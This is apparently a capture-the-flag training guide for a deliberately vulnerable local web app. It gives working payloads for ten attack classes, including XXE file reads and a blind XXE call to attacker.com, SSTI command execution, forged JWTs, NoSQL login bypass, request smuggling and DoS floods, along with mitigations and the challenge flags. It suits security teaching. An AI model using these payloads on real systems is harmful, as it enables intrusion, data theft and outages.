# Advanced Red Team & Bug Hunting Challenges

This guide covers modern web application vulnerabilities and advanced exploitation techniques beyond the OWASP Top 10. Each challenge represents real-world attack vectors commonly found in bug bounty programs and penetration testing engagements.

## Table of Contents

- [XML External Entity (XXE) Attacks](#a11-xml-external-entity-xxe-attacks)
- [Server-Side Template Injection (SSTI)](#a12-server-side-template-injection-ssti)
- [JWT Token Manipulation](#a13-jwt-token-manipulation)
- [Race Condition Vulnerabilities](#a14-race-condition-vulnerabilities)
- [NoSQL Injection](#a15-nosql-injection)
- [GraphQL Attacks](#a16-graphql-attacks)
- [WebSocket Vulnerabilities](#a17-websocket-vulnerabilities)
- [HTTP Request Smuggling](#a18-http-request-smuggling)
- [Rate Limiting Bypass](#a19-rate-limiting-bypass)
- [Mass Assignment](#a20-mass-assignment)

---

## A11: XML External Entity (XXE) Attacks

**Endpoint:** `POST /api/xml-parser`

**Objective:** Exploit XXE vulnerability to read local files and access internal resources.

### How to Exploit

1. **Basic XXE Attack:**
```bash
curl -X POST http://localhost:5000/api/xml-parser \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=<your-session-cookie>" \
  -d '{
    "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>"
  }'
```

2. **Blind XXE Attack:**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/hosts">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

### Why it Works

- The XML parser processes external entities without restriction
- No input validation or entity resolution restrictions
- Allows file system access through SYSTEM entities

### Mitigations

- Disable external entity processing in XML parsers
- Use safe parsing libraries with default secure configurations
- Implement input validation and sanitization
- Use JSON instead of XML when possible

**Flag:** `CTF{XXE_F1l3_R34d_Succ3ss}`

---

## A12: Server-Side Template Injection (SSTI)

**Endpoint:** `POST /api/render-template`

**Objective:** Inject malicious code into server-side templates to achieve remote code execution.

### How to Exploit

1. **Detection Phase:**
```bash
curl -X POST http://localhost:5000/api/render-template \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=<your-session-cookie>" \
  -d '{
    "template": "Hello {{7*7}}",
    "name": "User"
  }'
```

2. **Exploitation Phase:**
```javascript
// EJS template injection
{{require('child_process').exec('whoami')}}

// Node.js code execution
{{process.mainModule.require('child_process').execSync('id').toString()}}
```

3. **Full Exploit:**
```bash
curl -X POST http://localhost:5000/api/render-template \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=<your-session-cookie>" \
  -d '{
    "template": "{{process.version}}",
    "name": "Attacker"
  }'
```

### Why it Works

- User input is directly embedded in templates
- Template engine evaluates expressions at runtime
- No sandboxing or input validation
- Access to Node.js process and require functions

### Mitigations

- Never pass user input directly to template engines
- Use logic-less templates (Mustache, Handlebars in safe mode)
- Implement strict input validation and sanitization
- Sandbox template execution environments
- Use templating engines with auto-escaping enabled

**Flag:** `CTF{SSTI_C0d3_Ex3cut10n}`

---

## A13: JWT Token Manipulation

**Endpoints:** 
- `POST /api/auth/jwt-login` - Generate JWT token
- `GET /api/auth/jwt-verify` - Verify JWT token

**Objective:** Manipulate JWT tokens to escalate privileges and bypass authentication.

### How to Exploit

1. **Get Initial Token:**
```bash
curl -X POST http://localhost:5000/api/auth/jwt-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "password": "testpass"
  }'
```

2. **Algorithm Confusion Attack (None Algorithm):**
```javascript
// Decode the token at https://jwt.io
// Change algorithm to "none" in header
// Set admin: true in payload
// Remove signature

// Modified token:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwicm9sZSI6InVzZXIiLCJhZG1pbiI6dHJ1ZX0.
```

3. **Verify Modified Token:**
```bash
curl -X GET http://localhost:5000/api/auth/jwt-verify \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InRlc3QiLCJhZG1pbiI6dHJ1ZX0."
```

4. **Weak Secret Cracking:**
```bash
# Use hashcat or john to crack the weak secret
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# Once cracked, forge new tokens with admin privileges
```

### Why it Works

- Weak JWT secret key makes brute-force feasible
- "none" algorithm bypass not properly validated
- Token claims (admin, role) trusted without verification
- No token expiration or revocation mechanism

### Mitigations

- Use strong, randomly generated secrets (256+ bits)
- Explicitly validate algorithm and reject "none"
- Implement short token lifetimes with refresh tokens
- Store sensitive claims server-side, not in JWT
- Use asymmetric signing (RS256) for critical applications
- Implement token revocation/blacklisting
- Never trust client-provided claims for authorization

**Flag:** `CTF{JWT_T0k3n_M4n1pul4t10n}`

---

## A14: Race Condition Vulnerabilities

**Endpoint:** `POST /api/race-withdraw`

**Objective:** Exploit race conditions to withdraw more funds than available through concurrent requests.

### How to Exploit

1. **Single Request (Normal):**
```bash
curl -X POST http://localhost:5000/api/race-withdraw \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=<your-session-cookie>" \
  -d '{"amount": 100}'
```

2. **Race Condition Attack:**
```bash
# Send multiple concurrent requests
for i in {1..10}; do
  curl -X POST http://localhost:5000/api/race-withdraw \
    -H "Content-Type: application/json" \
    -H "Cookie: connect.sid=<your-session-cookie>" \
    -d '{"amount": 200}' &
done
wait
```

3. **Using Burp Suite Intruder:**
- Capture the withdrawal request
- Send to Intruder
- Set attack type to "Pitchfork"
- Use null payloads with 20+ threads
- Observe negative balance

### Why it Works

- Balance check and deduction are not atomic operations
- 100ms delay creates a window for race conditions
- No database-level locking or transactions
- Multiple requests can pass the balance check simultaneously
- No idempotency tokens to prevent duplicate processing

### Mitigations

- Use atomic database operations (transactions)
- Implement pessimistic or optimistic locking
- Use idempotency tokens for financial operations
- Implement request deduplication
- Add mutex locks for critical sections
- Use message queues for sequential processing
- Implement rate limiting per user account

**Flag:** `CTF{R4c3_C0nd1t10n_Expl01t}`

---

## A15: NoSQL Injection

**Endpoint:** `POST /api/nosql-login`

**Objective:** Bypass authentication using NoSQL injection techniques.

### How to Exploit

1. **Basic NoSQL Injection:**
```bash
curl -X POST http://localhost:5000/api/nosql-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$ne": null},
    "password": {"$ne": null}
  }'
```

2. **Regex-based Injection:**
```bash
curl -X POST http://localhost:5000/api/nosql-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$regex": ".*"},
    "password": {"$regex": ".*"}
  }'
```

3. **Or Operator Injection:**
```bash
curl -X POST http://localhost:5000/api/nosql-login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin",
    "password": {"$gt": ""}
  }'
```

### Why it Works

- Application accepts object types in JSON
- Query operators ($ne, $gt, $regex) are not sanitized
- MongoDB/NoSQL queries treat objects as operators
- No type checking on input parameters

### Mitigations

- Validate and sanitize all inputs
- Use parameterized queries or ODM/ORM
- Reject inputs that are not primitive types
- Implement strict type checking
- Whitelist allowed characters in usernames/passwords
- Use MongoDB's `$where` restrictions
- Enable NoSQL injection protection in frameworks

**Flag:** `CTF{N0SQL_1nj3ct10n_Byp4ss}`

---

## A16: GraphQL Attacks

**Endpoint:** `POST /api/graphql`

**Objective:** Exploit GraphQL introspection and query depth vulnerabilities.

### How to Exploit

1. **Introspection Query:**
```bash
curl -X POST http://localhost:5000/api/graphql \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=<your-session-cookie>" \
  -d '{
    "query": "query { __schema { types { name fields { name } } } }"
  }'
```

2. **Query Depth Attack (DoS):**
```bash
curl -X POST http://localhost:5000/api/graphql \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=<your-session-cookie>" \
  -d '{
    "query": "query { users { posts { comments { user { posts { comments { user { posts { comments { user { posts { comments { id } } } } } } } } } } } }"
  }'
```

3. **Field Duplication Attack:**
```graphql
query {
  user1: user(id: 1) { id name email }
  user2: user(id: 2) { id name email }
  user3: user(id: 3) { id name email }
  # ... repeat 1000 times
}
```

### Why it Works

- Introspection is enabled in production
- No query depth limiting
- No query complexity analysis
- No rate limiting on GraphQL endpoint
- Recursive relationships can be exploited

### Mitigations

- Disable introspection in production
- Implement query depth limiting (max 5-7 levels)
- Use query complexity analysis
- Implement query whitelisting/persisted queries
- Add rate limiting
- Implement query cost analysis
- Use DataLoader for batch loading
- Monitor and log expensive queries

**Flag:** `CTF{Gr4phQL_Intr0sp3ct10n}` or `CTF{Gr4phQL_D3pth_Att4ck}`

---

## A17: WebSocket Vulnerabilities

**Endpoint:** `GET /api/websocket-demo`

**Objective:** Exploit unvalidated WebSocket messages for injection attacks.

### How to Exploit

1. **Connect to WebSocket:**
```javascript
const ws = new WebSocket('ws://localhost:5000/ws');

ws.onopen = () => {
  // Send malicious payload
  ws.send(JSON.stringify({
    type: 'message',
    content: '<script>alert(document.cookie)</script>'
  }));
};
```

2. **Command Injection via WebSocket:**
```javascript
ws.send(JSON.stringify({
  action: 'execute',
  command: 'ls -la && cat /etc/passwd'
}));
```

3. **WebSocket DoS:**
```javascript
// Flood with large messages
for (let i = 0; i < 10000; i++) {
  ws.send('X'.repeat(1000000));
}
```

### Why it Works

- WebSocket messages are not validated
- No authentication check on WebSocket upgrade
- Messages are broadcast without sanitization
- No rate limiting on WebSocket connections
- CSRF tokens not required for WebSocket handshake

### Mitigations

- Validate and sanitize all WebSocket messages
- Implement authentication on WebSocket upgrade
- Use origin checking for WebSocket connections
- Implement rate limiting per connection
- Use message size limits
- Sanitize messages before broadcasting
- Implement CSRF tokens for WebSocket handshakes
- Use secure WebSocket (wss://) in production

**Flag:** `CTF{W3bS0ck3t_1nj3ct10n}`

---

## A18: HTTP Request Smuggling

**Endpoint:** `POST /api/smuggle-request`

**Objective:** Exploit HTTP request smuggling using conflicting Content-Length and Transfer-Encoding headers.

### How to Exploit

1. **CL.TE Smuggling:**
```bash
curl -X POST http://localhost:5000/api/smuggle-request \
  -H "Content-Length: 44" \
  -H "Transfer-Encoding: chunked" \
  -d "0

GET /admin HTTP/1.1
Host: localhost

"
```

2. **TE.CL Smuggling:**
```bash
curl -X POST http://localhost:5000/api/smuggle-request \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 6" \
  -d "0

X"
```

3. **Bypass Security Controls:**
```http
POST /api/smuggle-request HTTP/1.1
Host: localhost:5000
Content-Length: 150
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Authorization: Bearer admin_token
Content-Length: 10

x=1
```

### Why it Works

- Proxy and backend handle Content-Length/Transfer-Encoding differently
- Conflicting headers create parsing ambiguities
- Frontend sees one request, backend sees multiple
- Can poison connection reuse and bypass access controls

### Mitigations

- Reject requests with both Content-Length and Transfer-Encoding
- Normalize HTTP requests at edge/proxy level
- Use HTTP/2 which is not vulnerable
- Implement strict HTTP parsing
- Ensure consistent handling across all layers
- Use connection: close for suspicious requests
- Deploy WAF rules to detect smuggling attempts

**Flag:** `CTF{HTTP_R3qu3st_Smuggl1ng}`

---

## A19: Rate Limiting Bypass

**Endpoint:** `GET /api/rate-limit-test`

**Objective:** Bypass API rate limiting using header manipulation.

### How to Exploit

1. **Normal Request (Gets Rate Limited):**
```bash
for i in {1..150}; do
  curl -X GET http://localhost:5000/api/rate-limit-test
done
```

2. **Bypass with X-Client-Id Header:**
```bash
for i in {1..150}; do
  curl -X GET http://localhost:5000/api/rate-limit-test \
    -H "X-Client-Id: user-$RANDOM"
done
```

3. **Other Bypass Techniques:**
```bash
# Using X-Forwarded-For
curl -H "X-Forwarded-For: 1.2.3.$RANDOM"

# Using different user agents
curl -H "User-Agent: Mozilla/5.0 (Bot $RANDOM)"

# Using proxy rotation
curl --proxy http://proxy1.example.com
```

### Why it Works

- Rate limiting based on client-controlled headers
- X-Client-Id header can be arbitrarily set
- No validation of client identity
- Trusts client-provided identifiers
- Easy to rotate identifiers

### Mitigations

- Rate limit based on authenticated user ID
- Use server-side session identifiers
- Implement IP-based rate limiting
- Don't trust client-provided headers
- Use distributed rate limiting (Redis)
- Implement CAPTCHA after threshold
- Monitor for suspicious patterns
- Use device fingerprinting

**Flag:** `CTF{R4t3_L1m1t_Byp4ss}`

---

## A20: Mass Assignment

**Endpoint:** `POST /api/user-update`

**Objective:** Exploit mass assignment to escalate privileges by modifying protected fields.

### How to Exploit

1. **Normal Update:**
```bash
curl -X POST http://localhost:5000/api/user-update \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=<your-session-cookie>" \
  -d '{
    "email": "newemail@example.com",
    "name": "Updated Name"
  }'
```

2. **Privilege Escalation:**
```bash
curl -X POST http://localhost:5000/api/user-update \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=<your-session-cookie>" \
  -d '{
    "email": "attacker@example.com",
    "role": "admin",
    "isAdmin": true,
    "permissions": ["all"]
  }'
```

3. **Account Takeover:**
```bash
curl -X POST http://localhost:5000/api/user-update \
  -H "Content-Type: application/json" \
  -H "Cookie: connect.sid=<your-session-cookie>" \
  -d '{
    "password": "hacked123",
    "email": "attacker@evil.com"
  }'
```

### Why it Works

- Application accepts all fields from request body
- No whitelist of allowed fields
- Protected fields (role, isAdmin) can be modified
- No validation of field permissions
- Direct object assignment without filtering

### Mitigations

- Use explicit field whitelisting
- Never directly assign request body to models
- Implement separate DTOs for input/output
- Use framework-level protection (strong parameters)
- Validate field permissions before assignment
- Use immutable fields for sensitive data
- Implement proper authorization checks
- Log all privilege modifications

**Flag:** `CTF{M4ss_Ass1gnm3nt_R0l3_Esc}`

---

## General Bug Hunting Tips

### Reconnaissance
- Always start with endpoint enumeration
- Check for hidden parameters and headers
- Look for version disclosure in responses
- Map out the entire API surface

### Common Attack Vectors
1. **Input Validation**
   - Test all input fields with special characters
   - Try different encoding (URL, Base64, Hex)
   - Test boundary values and edge cases

2. **Authentication/Authorization**
   - Test for horizontal and vertical privilege escalation
   - Check for IDOR in all resource endpoints
   - Try accessing resources without authentication
   - Test session handling and token validation

3. **Business Logic**
   - Test race conditions on financial operations
   - Check for integer overflow/underflow
   - Test negative values and zero amounts
   - Look for workflow bypasses

4. **API Security**
   - Test for excessive data exposure
   - Check for lack of rate limiting
   - Test for CORS misconfigurations
   - Look for API versioning issues

### Tools and Resources
- **Burp Suite** - HTTP proxy and scanner
- **OWASP ZAP** - Open-source security scanner
- **Postman** - API testing and automation
- **jwt.io** - JWT decoder and debugger
- **Hashcat** - Password cracking
- **SQLMap** - SQL injection automation
- **NoSQLMap** - NoSQL injection tool

---

## Responsible Disclosure

Remember that these vulnerabilities are intentionally created for educational purposes. When finding real vulnerabilities:

1. **Never exploit beyond proof of concept**
2. **Report responsibly to the security team**
3. **Give organizations reasonable time to fix**
4. **Follow bug bounty program rules**
5. **Document your findings professionally**
6. **Don't disclose publicly without permission**

## Further Learning

- OWASP Testing Guide
- PortSwigger Web Security Academy
- HackerOne Disclosure Reports
- Bug Bounty Platforms (HackerOne, Bugcrowd, Synack)
- CTF Platforms (HackTheBox, TryHackMe, PentesterLab)

---

**Happy Ethical Hacking! 🎯🔒**
